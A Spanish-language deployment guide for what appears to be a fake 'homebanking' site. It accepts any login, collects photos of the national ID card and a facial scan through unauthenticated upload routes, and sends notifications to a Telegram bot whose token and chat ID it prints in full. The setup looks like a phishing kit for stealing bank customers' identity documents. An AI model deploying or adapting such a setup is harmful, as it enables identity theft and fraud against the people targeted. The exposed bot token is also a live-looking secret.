# 🚀 DEPLOY MANUAL - INSTRUCCIONES RÁPIDAS

## ✅ FRONTEND YA ESTÁ ACTUALIZADO
URL: https://homebanking-frontend.vercel.app

## 🔧 BACKEND - ACTUALIZAR EN RAILWAY

### Opción 1: Redeploy desde Railway Dashboard (MÁS RÁPIDO)

1. Ve a: https://railway.app
2. Inicia sesión
3. Selecciona tu proyecto
4. Busca el servicio del backend
5. Ve a **Settings**
6. Scroll hasta **Variables**
7. Verifica/Actualiza estas variables:
   ```
   TELEGRAM_BOT_TOKEN=8094708506:AAFnHbREy8M_7Zj1doPqNxl0RtNnnObr-KY
   TELEGRAM_CHAT_ID=8523843948
   JWT_SECRET=tu-secreto-super-seguro-cambiar-en-produccion-123456
   CORS_ORIGIN=*
   PORT=3000
   ```
8. Ve a **Deployments**
9. Click en los **3 puntos** del último deployment
10. Click **Redeploy**

### Opción 2: Trigger Deploy desde GitHub

1. Ve a tu repositorio: https://github.com/bipmail-hue/bip
2. Edita el archivo `homebanking-backend/src/server.ts`
3. En la línea 55, cambia:
   - DE: `app.use(express.json({ limit: '10kb' }));`
   - A: `app.use(express.json({ limit: '50mb' }));`
4. Commit y push
5. Railway detectará el cambio y deployará automáticamente

### Opción 3: Deploy Manual con Railway CLI

```bash
cd homebanking-backend
railway link
railway up
```

## 📱 URLs FINALES

- **Frontend**: https://homebanking-frontend.vercel.app
- **Backend**: https://bip-production.up.railway.app

## 🧪 PRUEBA DESDE EL CELULAR

1. Abre: https://homebanking-frontend.vercel.app
2. Login con cualquier usuario/clave
3. Sube fotos del DNI
4. Completa verificación facial
5. Revisa Telegram para las notificaciones

## ⚠️ IMPORTANTE

Si el backend no se actualiza, los cambios importantes son:

1. **Límite de payload aumentado** (línea 55-56 de server.ts):
   ```typescript
   app.use(express.json({ limit: '50mb' }));
   app.use(express.urlencoded({ extended: true, limit: '50mb' }));
   ```

2. **Rutas sin autenticación** (verification.routes.ts):
   ```typescript
   router.post('/dni', verifyDNI);
   router.post('/facial', verifyFacial);
   ```

3. **Bot de Telegram configurado** (.env):
   ```
   TELEGRAM_BOT_TOKEN=8094708506:AAFnHbREy8M_7Zj1doPqNxl0RtNnnObr-KY
   TELEGRAM_CHAT_ID=8523843948
   ```
